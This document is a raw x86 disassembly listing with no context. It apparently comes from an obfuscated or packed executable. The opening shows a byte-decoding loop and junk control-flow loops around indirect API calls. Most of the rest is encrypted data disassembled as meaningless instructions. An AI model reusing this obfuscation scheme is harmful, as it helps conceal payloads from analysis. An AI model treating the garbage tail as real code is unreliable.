  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	mov    edi,0x4081aee2
  4115b0:	scas   eax,DWORD PTR es:[edi]
  4115b1:	jl     0x41162f
  4115b3:	inc    eax
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	jne    0x411588
  4115b9:	imul   edx,DWORD PTR [ecx],0xffffffc2
  4115bc:	jp     0x4115cf
  4115be:	or     DWORD PTR [eax+0x48bd683d],0xfffffffa
  4115c5:	or     al,0xd9
  4115c7:	retf   0x5be4
  4115ca:	push   ds
  4115cb:	mov    al,ds:0x3db42e58
  4115d0:	push   ebp
  4115d1:	repz ss jb 0x4115d5
  4115d5:	mov    ds:0xec681f8f,al
  4115da:	xchg   BYTE PTR [edx],ah
  4115dc:	push   ebp
  4115dd:	mov    ch,0x92
  4115df:	fisttp WORD PTR [ecx+0x7]
  4115e2:	pop    edi
  4115e3:	push   ss
  4115e4:	or     BYTE PTR [ebx+0x61],bh
  4115e7:	and    bh,0xfa
  4115ea:	sar    BYTE PTR [edx-0x4a],1
  4115ed:	sbb    esp,0x7e
  4115f0:	jnp    0x4115ce
  4115f2:	push   ecx
  4115f3:	pop    esi
  4115f4:	and    ah,cl
  4115f6:	(bad)  
  4115f8:	lods   eax,DWORD PTR ds:[esi]
  4115f9:	jbe    0x4115e9
  4115fb:	mov    ah,0x60
  4115fd:	adc    ecx,esi
  4115ff:	ficom  WORD PTR [esi]
  411601:	scas   al,BYTE PTR es:[edi]
  411602:	mov    al,BYTE PTR [edi+0x71aaa613]
  411608:	outs   dx,BYTE PTR ds:[esi]
  411609:	in     al,0x40
  41160b:	cmp    BYTE PTR [eax+0x71],bh
  41160e:	pop    ecx
  41160f:	dec    esp
  411610:	cvtpi2ps xmm1,QWORD PTR [ecx+edi*2]
  411614:	into   
  411615:	mov    ebx,0x44f2d8c3
  41161a:	add    DWORD PTR [esi+edi*4-0x5e],0x6e4c09e8
  411622:	sbb    DWORD PTR [esi],eax
  411624:	jbe    0x41163f
  411626:	sub    eax,DWORD PTR ds:0xf0887bdb
  41162c:	ins    DWORD PTR es:[edi],dx
  41162d:	push   eax
  41162e:	mov    eax,ds:0x1e90bf9e
  411633:	add    DWORD PTR [edx+0x7dd2ffe2],esi
  411639:	test   al,0x24
  41163b:	scas   eax,DWORD PTR es:[edi]
  41163c:	int3   
  41163d:	mov    eax,ds:0x3ed94ff
  411642:	xor    ebp,DWORD PTR [eax-0x59]
  411645:	(bad)  
  411646:	xor    al,0xe6
  411648:	(bad)  
  411649:	fwait
  41164a:	imul   DWORD PTR [eax]
  41164c:	push   ds
  41164d:	jns    0x411616
  41164f:	pop    edx
  411650:	mov    esi,0x167d5a57
  411655:	mov    cl,0xa1
  411658:	fild   QWORD PTR [eax-0x6f]
  41165b:	clc    
  41165c:	adc    bl,0xe2
  41165f:	(bad)  
  411660:	xchg   ebx,eax
  411661:	xchg   esp,eax
  411662:	push   ds
  411663:	push   ss
  411664:	mov    esp,0xc24a784
  411669:	add    BYTE PTR [esi],bh
  41166b:	daa    
  41166c:	(bad)  
  41166f:	push   es
  411670:	rcl    BYTE PTR [eax+ecx*4+0x12da2279],0xff
  411678:	scas   eax,DWORD PTR es:[edi]
  411679:	out    dx,al
  41167a:	add    al,0x85
  41167d:	lods   eax,DWORD PTR ds:[esi]
  41167e:	jbe    0x41167e
  411680:	xchg   edi,eax
  411681:	loopne 0x4116f1
  411683:	fild   QWORD PTR [eax]
  411685:	xchg   DWORD PTR [edi-0x35],ecx
  411688:	jp     0x411648
  41168a:	outs   dx,DWORD PTR ds:[esi]
  41168b:	dec    edx
  41168c:	cli    
  41168d:	and    dl,al
  41168f:	or     al,0xf4
  411691:	rcl    cl,0x4
  411694:	or     al,0xb7
  411696:	std    
  411697:	(bad)  [eax+0x76]
  41169a:	mov    bh,0x4b
  41169c:	jae    0x41164d
  41169e:	mov    ah,0x4b
  4116a0:	cmp    DWORD PTR [eax-0x79700438],edi
  4116a6:	bound  esp,QWORD PTR [ebx]
  4116a8:	test   al,0xe5
  4116aa:	mov    bh,0x17
  4116ac:	ror    DWORD PTR [ebp-0x43d8de47],0x98
  4116b3:	xchg   edx,eax
  4116b4:	lahf   
  4116b5:	jmp    0x411712
  4116b7:	sbb    ah,BYTE PTR [esi+0x59e639af]
  4116bd:	sub    dh,BYTE PTR [esi]
  4116bf:	ret    0x4413
  4116c2:	sbb    eax,0x5ea78bab
  4116c7:	popf   
  4116c8:	into   
  4116c9:	dec    edx
  4116ca:	in     al,0x29
  4116cc:	shl    bl,cl
  4116ce:	(bad)  
  4116cf:	jecxz  0x411729
  4116d1:	popa   
  4116d2:	cmp    al,0x27
  4116d4:	js     0x4116b3
  4116d6:	mov    ch,0x54
  4116d8:	cmp    ebx,ebp
  4116da:	dec    edx
  4116db:	cmp    dl,BYTE PTR [esi+0x7e]
  4116de:	cmc    
  4116df:	mov    edx,0xf889e496
  4116e4:	pop    ecx
  4116e5:	jecxz  0x4116dc
  4116e7:	push   ecx
  4116e8:	mov    ds:0x899a816,eax
  4116ed:	push   edx
  4116ee:	mov    cl,0x6e
  4116f0:	hlt    
  4116f1:	lahf   
  4116f2:	mov    esi,0xcf0be23
  4116f7:	test   DWORD PTR [eax-0x63],ebp
  4116fa:	movntps XMMWORD PTR [eax+0x43],xmm2
  4116fe:	es addr16 push cs
  411701:	or     BYTE PTR [ebp-0x6],0xb1
  411705:	test   BYTE PTR [ecx+0x3bea998b],al
  41170b:	pop    ss
  41170c:	adc    edi,DWORD PTR [eax]
  41170e:	imul   dl
  411710:	sub    edx,ecx
  411712:	or     bh,BYTE PTR [ebx]
  411714:	fdiv   QWORD PTR [edi]
  411716:	jns    0x4116a3
  411718:	inc    edi
  411719:	pop    ecx
  41171a:	fwait
  41171b:	aad    0xcc
  41171d:	popf   
  41171e:	fstp   TBYTE PTR [edx-0x161239f8]
  411724:	cmp    eax,0x5e354866
  411729:	cmp    BYTE PTR [eax],0x20
  41172c:	sbb    eax,0x36ddda01
  411731:	lods   eax,DWORD PTR ds:[esi]
  411732:	adc    ch,BYTE PTR [ecx-0x47]
  411735:	cmp    al,0xc7
  411737:	jne    0x41175c
  411739:	or     esp,DWORD PTR [ecx-0x4dbabad2]
  41173f:	dec    esp
  411740:	mov    eax,DWORD PTR [eax-0x67]
  411743:	add    DWORD PTR [ebx-0x4a],0xb41f76db
  41174a:	stos   BYTE PTR es:[edi],al
  41174b:	jmp    0x411793
  41174d:	sti    
  41174e:	mov    eax,0xaf6e875d
  411753:	shl    BYTE PTR [edi],1
  411755:	cmp    esi,DWORD PTR [esi+0x27b0c101]
  41175b:	push   esi
  41175c:	jmp    0x96d8:0x476037a0
  411763:	in     eax,0x37
  411765:	in     al,0x1e
  411767:	xor    esp,DWORD PTR [edi+0x20]
  41176a:	les    esp,FWORD PTR [esi+0x40]
  41176d:	outs   dx,DWORD PTR ds:[esi]
  41176e:	into   
  41176f:	hlt    
  411770:	les    edi,FWORD PTR ds:0xf3a7c38b
  411776:	mov    bl,0x43
  411778:	call   FWORD PTR [edi-0x2e6428e2]
  41177e:	hlt    
  41177f:	out    0xcd,eax
  411781:	sub    BYTE PTR [eax-0x6b],bl
  411784:	cmp    eax,0x201693e9
  411789:	in     eax,dx
  41178a:	mov    al,ds:0x629734b2
  41178f:	jbe    0x411722
  411791:	push   ds
  411792:	lock arpl WORD PTR [eax-0x44],ax
  411796:	ins    DWORD PTR es:[edi],dx
  411797:	fnsave [esp+edx*4]
  41179a:	push   es
  41179b:	lock imul ecx,DWORD PTR [ebx],0x37
  41179f:	ret    0xb5c3
  4117a2:	ins    BYTE PTR es:[edi],dx
  4117a3:	js     0x411818
  4117a5:	sbb    ebx,esp
  4117a7:	pop    es
  4117a8:	daa    
  4117a9:	outs   dx,DWORD PTR ds:[esi]
  4117aa:	xor    ah,BYTE PTR [esp+ecx*2+0x1db9f61c]
  4117b1:	leave  
  4117b2:	retf   
  4117b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117b4:	aad    0x70
  4117b6:	xchg   edx,eax
  4117b7:	scas   eax,DWORD PTR es:[edi]
  4117b8:	jecxz  0x4117bf
  4117ba:	dec    edx
  4117bb:	pop    eax
  4117bc:	mov    ecx,0x1ac84aa7
  4117c1:	lods   eax,DWORD PTR ds:[esi]
  4117c2:	rcr    BYTE PTR ds:0xb37dd34e,1
  4117c8:	loope  0x411806
  4117ca:	js     0x41181f
  4117cc:	xor    ebx,DWORD PTR [ebp+0x66dd809]
  4117d2:	push   eax
  4117d3:	and    esp,esp
  4117d5:	in     al,dx
  4117d6:	add    al,0xdf
  4117d8:	test   al,0x98
  4117da:	adc    DWORD PTR ds:[edx+0x3236350c],0xffffffd4
  4117e2:	sbb    BYTE PTR ds:0xc8315975,al
  4117e8:	stos   BYTE PTR es:[edi],al
  4117e9:	cmp    eax,0xad6ee21a
  4117ee:	retf   0xcde6
  4117f1:	lds    esi,FWORD PTR [ebp-0x6c]
  4117f4:	inc    eax
  4117f5:	cmp    eax,DWORD PTR [edx+0x65c089c1]
  4117fb:	lds    edx,FWORD PTR [esi]
  4117fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117fe:	repnz push cs
  411800:	es inc ecx
  411802:	leave  
  411803:	pop    ds
  411804:	inc    edi
  411805:	pop    eax
  411806:	and    DWORD PTR [ebp-0x7fa65b40],0xd755484c
  411810:	xchg   ebx,eax
  411811:	icebp  
  411812:	dec    esp
  411813:	lods   al,BYTE PTR ds:[esi]
  411814:	ins    DWORD PTR es:[edi],dx
  411815:	std    
  411816:	jecxz  0x4117df
  411818:	dec    ebp
  411819:	xor    al,0x4d
  41181b:	mov    dl,BYTE PTR [eax]
  41181d:	push   0xffffff8d
  41181f:	mov    cl,0x19
  411821:	mov    dl,BYTE PTR gs:[ebx-0x9]
  411825:	sbb    DWORD PTR [ebp+0x3b],ebp
  411828:	cmp    al,0xdb
  41182a:	ins    BYTE PTR es:[edi],dx
  41182b:	shl    DWORD PTR [esi+0x2c063fc],0x28
  411832:	xchg   ebx,eax
  411833:	lods   al,BYTE PTR ds:[esi]
  411834:	test   al,0xbb
  411836:	pushf  
  411837:	sbb    eax,0x978105dc
  41183c:	xchg   ecx,eax
  41183d:	neg    DWORD PTR [ebx-0x4d98c262]
  411843:	pop    edi
  411844:	(bad)  
  411845:	fistp  QWORD PTR [edi-0x51]
  411848:	sahf   
  411849:	je     0xbcf99832
  41184f:	xor    eax,0x6c0fc6fe
  411854:	jle    0x4117d9
  411856:	jb     0x41189f
  411858:	stos   DWORD PTR es:[edi],eax
  411859:	cwde   
  41185a:	sub    DWORD PTR [edi+ebp*4],0x56
  41185e:	popf   
  41185f:	loop   0x411895
  411861:	addr16 push ds
  411863:	dec    eax
  411864:	dec    edx
  411865:	inc    edi
  411866:	fistp  WORD PTR [edi]
  411868:	jo     0x41181c
  41186a:	pop    ebp
  41186b:	in     al,dx
  41186c:	xbegin 0xa3fe6229
  411872:	into   
  411873:	sahf   
  411874:	inc    eax
  411875:	xchg   edi,eax
  411876:	lea    eax,[edi]
  411878:	add    BYTE PTR [ebx+0x4dbd208c],bh
  41187e:	cli    
  41187f:	lahf   
  411880:	cmp    eax,ebp
  411882:	jae    0x4118c5
  411884:	pop    esi
  411885:	add    eax,0x35e72379
  41188a:	fwait
  41188b:	dec    ebp
  41188c:	jle    0x4118b2
  41188e:	jns    0x41190d
  411890:	xchg   ebx,eax
  411891:	call   DWORD PTR [ebp+ebx*8-0x3b]
  411895:	mov    BYTE PTR [edx-0x75],0x18
  411899:	rcr    BYTE PTR [ebx+edi*1],cl
  41189c:	xchg   edx,eax
  41189d:	xlat   BYTE PTR ds:[ebx]
  41189e:	daa    
  41189f:	jg     0x41182e
  4118a1:	mov    ds:0xd3b7edd3,eax
  4118a6:	sbb    eax,0x336251a6
  4118ab:	bound  edx,QWORD PTR ss:[edi-0x5b]
  4118af:	sbb    BYTE PTR [edx],dl
  4118b1:	mov    ch,0xc3
  4118b3:	cmp    al,0x56
  4118b5:	jl     0x411846
  4118b7:	in     al,dx
  4118b8:	imul   ebp,DWORD PTR [esi-0x3c],0x2c
  4118bc:	std    
  4118bd:	jmp    0x2066c5b4
  4118c2:	push   es
  4118c3:	nop
  4118c4:	pop    eax
  4118c5:	adc    DWORD PTR [eax+edi*1],ebp
  4118c8:	sar    DWORD PTR [ecx+0x11],cl
  4118cb:	jg     0x4118f5
  4118cd:	test   eax,0x1e1574f
  4118d2:	lods   al,BYTE PTR ds:[esi]
  4118d3:	stc    
  4118d4:	fldenv [eax-0x3e878130]
  4118da:	ds xchg ebp,eax
  4118dc:	(bad)  
  4118dd:	fist   WORD PTR [ebp+ebp*4+0x22c89578]
  4118e4:	loope  0x41190d
  4118e6:	add    eax,0x6260f63
  4118eb:	lods   al,BYTE PTR ds:[esi]
  4118ec:	je     0x41191e
  4118ee:	(bad)  
  4118ef:	lods   al,BYTE PTR ds:[esi]
  4118f0:	adc    bl,BYTE PTR [esi-0x21]
  4118f3:	stos   BYTE PTR es:[edi],al
  4118f4:	ds test al,0xec
  4118f7:	pop    ebp
  4118f8:	out    dx,eax
  4118f9:	pop    ss
  4118fa:	xor    bl,ah
  4118fc:	mov    ds:0xc19377fe,eax
  411901:	jbe    0x41192e
  411903:	inc    edi
  411904:	xor    al,0x2f
  411906:	add    DWORD PTR [ecx-0x4684714],0xffffffb4
  41190d:	adc    eax,ebp
  41190f:	push   0x7c
  411911:	push   ecx
  411912:	ss jne 0x4118ad
  411915:	xchg   BYTE PTR [edx],cl
  411917:	sub    eax,0xeaf7f927
  41191c:	pop    esp
  41191d:	xor    al,0x80
  41191f:	cs jle 0x4118a3
  411922:	sbb    bh,BYTE PTR [edi+ecx*4]
  411925:	aas    
  411926:	and    al,0x8d
  411928:	and    al,0xd2
  41192a:	cmp    esp,DWORD PTR [eax+0x0]
  41192d:	pusha  
  41192e:	out    dx,eax
  41192f:	(bad)  
  411930:	and    esp,DWORD PTR [edi]
  411932:	inc    edi
  411933:	add    ecx,ebp
  411935:	mov    ebp,0x732cd381
  41193a:	fld    QWORD PTR [edi-0x6739dc88]
  411940:	jle    0x41193a
  411942:	pushf  
  411943:	std    
  411944:	jno    0x41198a
  411946:	sub    BYTE PTR [edi-0x3a3db1bf],cl
  41194c:	push   ds
  41194d:	(bad)  
  41194e:	loope  0x411944
  411950:	cmp    DWORD PTR [edx+0x54],esi
  411953:	aaa    
  411954:	call   0xe6c0:0xfc25d79c
  41195b:	push   eax
  41195c:	cmp    esi,edx
  41195e:	inc    esi
  41195f:	test   al,0xa0
  411961:	pop    eax
  411962:	add    al,0xcc
  411964:	retf   
  411965:	push   eax
  411966:	dec    ebx
  411967:	push   ds
  411968:	push   eax
  411969:	mov    ds,WORD PTR [esi-0x60]
  41196c:	les    ecx,FWORD PTR fs:[esi+edx*2]
  411970:	lods   al,BYTE PTR ds:[esi]
  411971:	or     cl,BYTE PTR [ecx]
  411973:	inc    ebx
  411974:	ret    0x59e9
  411977:	cmp    ebx,DWORD PTR [edx-0x1]
  41197a:	or     DWORD PTR [ecx],esi
  41197c:	out    0x3e,al
  41197e:	out    dx,eax
  41197f:	or     DWORD PTR [ebx-0x30],0x58
  411983:	mov    dl,0xae
  411985:	adc    BYTE PTR [ebp+edx*4+0x5218cb74],bh
  41198c:	(bad)  
  41198d:	cmp    BYTE PTR [ecx+ebx*8+0x31],cl
  411991:	in     eax,dx
  411992:	sbb    eax,0x7ce0d34a
  411997:	cmp    esp,DWORD PTR [ecx]
  411999:	sahf   
  41199a:	adc    eax,0x6ab05be6
  41199f:	pop    ebp
  4119a0:	mov    esi,0x459a4cc1
  4119a5:	sub    al,0x2e
  4119a7:	lods   eax,DWORD PTR ds:[esi]
  4119a8:	sub    dh,BYTE PTR [esi]
  4119aa:	iret   
  4119ab:	pop    ebx
  4119ac:	stos   BYTE PTR es:[edi],al
  4119ad:	nop
  4119ae:	loop   0x4119c6
  4119b0:	cld    
  4119b1:	stc    
  4119b2:	(bad)  
  4119b3:	fisttp QWORD PTR ds:0x98c85ce6
  4119b9:	mov    ss,edx
  4119bb:	mov    eax,DWORD PTR [ebx-0x45]
  4119be:	js     0x411a31
  4119c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119c1:	mov    bl,BYTE PTR [edx+0xd]
  4119c4:	icebp  
  4119c5:	jge    0x411964
  4119c7:	jae    0x411a17
  4119c9:	call   0x8063a7a3
  4119ce:	imul   eax,esi,0x56
  4119d1:	and    al,0xf3
  4119d3:	imul   edi,DWORD PTR ds:0x8dc0a0f5,0xf12fb862
  4119dd:	ret    
  4119de:	ins    DWORD PTR es:[edi],dx
  4119df:	dec    edx
  4119e0:	xchg   esp,eax
  4119e1:	jl     0x411a23
  4119e3:	int    0xf5
  4119e5:	test   eax,0x1df2286c
  4119ea:	sbb    eax,0x7ec0c6a4
  4119ef:	pop    ebp
  4119f0:	sbb    DWORD PTR [edi],esp
  4119f2:	push   es
  4119f3:	pusha  
  4119f4:	add    ebp,DWORD PTR [eax]
  4119f6:	aam    0xb4
  4119f8:	adc    al,0x3b
  4119fa:	(bad)  
  4119fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119fc:	cmp    ebp,edi
  4119fe:	or     al,0x0
  411a00:	scas   eax,DWORD PTR es:[edi]
  411a01:	aad    0x3c
  411a03:	enter  0x6300,0x1a
  411a07:	pop    eax
  411a08:	in     al,0x6f
  411a0a:	add    DWORD PTR [edx],esp
  411a0c:	leave  
  411a0d:	jmp    0x25f9:0x3383b829
  411a14:	jbe    0x411a24
  411a16:	enter  0x9968,0x76
  411a1a:	mov    ch,0x86
  411a1c:	push   cs
  411a1d:	sub    bh,dh
  411a1f:	xchg   edx,eax
  411a20:	(bad)  
  411a21:	in     eax,dx
  411a22:	xor    BYTE PTR [esi],ah
  411a24:	scas   al,BYTE PTR es:[edi]
  411a25:	push   ss
  411a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a27:	unpckhps xmm4,XMMWORD PTR [esi+0x6]
  411a2b:	dec    ebp
  411a2c:	mov    eax,0xb4eefee2
  411a31:	lods   eax,DWORD PTR ds:[esi]
  411a32:	out    dx,eax
  411a33:	pusha  
  411a34:	push   cs
  411a35:	pop    edx
  411a36:	xchg   edx,eax
  411a37:	sub    al,0x20
  411a39:	out    dx,al
  411a3a:	int3   
  411a3b:	test   al,0xb6
  411a3d:	add    eax,0x4db1c2bb
  411a42:	jg     0x4119e1
  411a44:	repnz lock mov al,ds:0x7374631
  411a4b:	daa    
  411a4c:	jg     0x411ab5
  411a4e:	mov    ebp,0x2add27dd
  411a53:	inc    eax
  411a54:	jnp    0x4119d6
  411a56:	add    esi,DWORD PTR [ecx-0x35]
  411a59:	push   ebp
  411a5a:	sub    al,0x22
  411a5c:	(bad)  
  411a5d:	pusha  
  411a5e:	outs   dx,DWORD PTR ds:[esi]
  411a5f:	mov    esp,0x76e8bdac
  411a64:	pop    edi
  411a65:	lods   eax,DWORD PTR ds:[esi]
  411a66:	push   0xffffffa5
  411a68:	mov    eax,ds:0x461dfcbc
  411a6d:	cld    
  411a6e:	push   esi
  411a6f:	(bad)  
  411a70:	icebp  
  411a71:	xchg   ebx,eax
  411a72:	test   al,0x68
  411a74:	add    ecx,eax
  411a76:	nop
  411a77:	push   0x89acd605
  411a7c:	stc    
  411a7d:	rol    BYTE PTR [ebp+0x2ab28bda],1
  411a83:	and    BYTE PTR [edx],dl
  411a85:	leave  
  411a86:	cs pop es
  411a88:	mov    ecx,0x6388b6c5
  411a8d:	in     al,0x12
  411a8f:	loop   0x411a95
  411a91:	sti    
  411a92:	jmp    0xe1b3de9a
  411a97:	sbb    edx,edx
  411a99:	mov    WORD PTR [edi],cs
  411a9b:	fst    QWORD PTR [edx-0x58]
  411a9e:	jns    0x411aec
  411aa0:	call   0x484d30ce
  411aa5:	sub    ebx,eax
  411aa7:	je     0x411ad7
  411aa9:	xchg   edx,edi
  411aab:	test   esi,edi
  411aad:	les    esi,FWORD PTR [edi+eiz*2-0x4fd844b6]
  411ab4:	sub    al,0x34
  411ab6:	inc    esi
  411ab7:	mov    al,ds:0x22684493
  411abc:	cmp    eax,DWORD PTR [edi+0xa180338]
  411ac2:	fld    QWORD PTR [edi+0x5f]
  411ac5:	call   0x12d10c73
  411aca:	cmp    eax,0x35f0d976
  411acf:	cmp    al,0x8a
  411ad1:	dec    eax
  411ad2:	ins    BYTE PTR es:[edi],dx
  411ad3:	in     eax,dx
  411ad4:	adc    al,BYTE PTR [ebp-0x5]
  411ad7:	lods   eax,DWORD PTR ds:[esi]
  411ad8:	mov    al,ds:0x2c79f529
  411add:	loopne 0x411ada
  411adf:	ret    0x9c07
  411ae2:	stc    
  411ae3:	mov    bh,dh
  411ae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ae6:	jmp    0xb66:0xb5a9be9c
  411aed:	inc    edx
  411aee:	jae    0x411ad5
  411af0:	call   0x4561:0x10634f4a
  411af7:	mov    ah,0x7
  411af9:	outs   dx,BYTE PTR ds:[esi]
  411afa:	mov    esi,0x25543e9c
  411aff:	mov    esp,0x9989cd54
  411b04:	loopne 0x411aa5
  411b06:	sbb    al,0x11
  411b08:	add    bh,BYTE PTR [edi+ebp*2-0x5f5df96e]
  411b0f:	(bad)  
  411b10:	sar    DWORD PTR [ebx+edx*4],cl
  411b13:	fdivr  QWORD PTR [edi-0x15]
  411b16:	es push eax
  411b18:	popf   
  411b19:	fdiv   QWORD PTR [edx-0x69]
  411b1c:	cmc    
  411b1d:	lods   al,BYTE PTR ds:[esi]
  411b1e:	lods   al,BYTE PTR ds:[esi]
  411b1f:	out    dx,al
  411b20:	cmp    bh,BYTE PTR [esp+esi*4+0x25]
  411b24:	xor    al,ch
  411b26:	enter  0xb822,0x27
  411b2a:	repnz lods eax,DWORD PTR ds:[esi]
  411b2c:	pop    edi
  411b2d:	pop    edi
  411b2e:	jg     0x411b4e
  411b30:	inc    ebx
  411b31:	imul   ebp,DWORD PTR ds:[edi+0x17],0x71
  411b36:	pop    si
  411b38:	mov    edi,0xdbccf15e
  411b3d:	xlat   BYTE PTR ds:[ebx]
  411b3e:	(bad)  
  411b3f:	xchg   edx,eax
  411b40:	ror    DWORD PTR [ecx+edi*4+0x16ca3d5c],0x88
  411b48:	js     0x411ba1
  411b4a:	mov    esp,0x84d3fab8
  411b4f:	push   0xbb060604
  411b54:	loop   0x411b12
  411b56:	sbb    ax,0x92fd
  411b5a:	bound  edi,QWORD PTR [edi]
  411b5c:	push   edi
  411b5d:	out    0x2,al
  411b5f:	loope  0x411bb3
  411b61:	xchg   edi,ebp
  411b63:	jecxz  0x411b81
  411b65:	enter  0x7656,0x58
  411b69:	xor    ebp,edx
  411b6b:	sahf   
  411b6c:	jecxz  0x411b17
  411b6e:	xor    DWORD PTR [esi],esi
  411b70:	cmp    DWORD PTR [ebp+0x1c],esp
  411b73:	and    eax,0x80cefea7
  411b78:	inc    esi
  411b79:	fadd   DWORD PTR [ecx-0x27]
  411b7c:	pusha  
  411b7d:	test   al,0x0
  411b7f:	addr16 sub ch,dh
  411b82:	inc    esp
  411b83:	mov    edi,0xb1246358
